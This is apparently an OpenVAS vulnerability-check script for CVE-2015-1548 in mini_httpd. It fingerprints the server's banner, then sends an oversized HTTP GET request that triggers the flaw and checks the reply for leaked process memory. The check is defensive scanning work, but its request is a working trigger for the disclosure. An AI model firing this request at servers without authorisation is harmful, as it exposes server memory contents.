if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805289" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2015-1548" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-02-24 16:28:18 +0530 (Tue, 24 Feb 2015)" );
	script_name( "mini_httpd server Long Protocol String Information Disclosure Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with mini_httpd
  server and is prone to information disclosure vulnerability" );
	script_tag( name: "vuldetect", value: "Send the crafted HTTP GET request and
  check is it possible to read information from the process memory" );
	script_tag( name: "insight", value: "The flaw exists due to an error in the
  'add_headers' function in mini_httpd.c script" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to gain access to potentially sensitive information in the memory." );
	script_tag( name: "affected", value: "mini_httpd server version 1.21 and prior." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_active" );
	script_xref( name: "URL", value: "http://itinsight.hu/en/posts/articles/2015-01-23-mini-httpd" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "mini_httpd/banner" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
minPort = http_get_port( default: 80 );
Banner = http_get_remote_headers( port: minPort );
if(!Banner || !ContainsString( Banner, "Server: mini_httpd" )){
	exit( 0 );
}
minReq = http_get( item: NASLString( "/ ", crap( length: 25000, data: "X" ) ), port: minPort );
minRes = http_keepalive_send_recv( port: minPort, data: minReq );
if(IsMatchRegexp( hexstr( minRes ), "2e00696e6465782e68746d6c" )){
	security_message( minPort );
	exit( 0 );
}

